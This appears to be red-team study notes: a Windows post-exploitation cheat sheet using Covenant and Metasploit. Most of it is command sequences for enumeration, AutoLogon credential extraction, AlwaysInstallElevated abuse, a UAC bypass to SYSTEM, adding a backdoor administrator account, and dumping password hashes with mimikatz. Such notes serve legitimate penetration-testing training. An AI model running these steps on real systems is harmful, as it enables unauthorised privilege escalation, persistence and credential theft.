# Enumeration, Privilege Escalation and Persistence

* For local enumeration with Covenant, we can use ```Seatbelt``` in our grunt - this gives us a lot of output to go through.

* For local enumeration with Metasploit, we can do the following:

  ```shell
  # in reverse shell session on Metasploit

  sysinfo

  getuid

  ipconfig
  # check for new subnets

  arp
  # check for other devices on same network

  netstat -ano

  run post/windows/gather/enum_services
  # enumerate running services

  run post/windows/gather/enum_applications
  # enumerate installed apps

  run post/windows/gather/enum_domains
  # might not work

  route

  # more enum
  ```

* AutoLogon exploitation:

  ```shell
  # use PowerView in Covenant

  powershell invoke-allchecks
  # this gives us the Autologon creds

  # can use Seatbelt as well
  Seatbelt WindowsAutoLogon
  ```

* AlwaysInstallElevated exploitation:

  ```shell
  # use sharpup in Covenant
  # similar to PowerView

  sharpup audit
  # shows AlwaysInstallElevated registry count 1

  # generate a malicious installer using msfvenom
  # and upload it to target and run it
  ```

* UAC bypass:

  ```shell
  # in Metasploit

  sessions -i 1
  # access existing session

  run post/multi/recon/local_exploit_suggester
  # use bypass uac exploit

  # background session using Ctrl+Z

  use exploit/windows/local/bypassuac_dotnet_profiler

  # config exploit options

  exploit -j

  # gives new session
  
  sessions -i 4

  getuid
  # still not system

  ps
  # we can view system processes

  migrate 580
  # migrate to any system process

  getuid
  # we are system now
  ```

* New user persistence:

  ```shell
  # in existing remote session in Covenant

  shellcmd net users newuser Password123! /add

  shell net users
  # shows newly created user

  shell net localgroup administrators newuser /add
  # add to administrators group
  ```

* Dumping hashes:

  ```shell
  # in Metasploit session

  run post/windows/gather/win_privs

  getsystem

  getuid
  # system user

  hashdump
  # dumps hashes

  load kiwi
  # load mimikatz

  help
  # view all commands

  creds_all
  # this dumps hashes as well

  lsa_dump_sam
  # hashes can be cracked using Hashcat or JtR
  ```
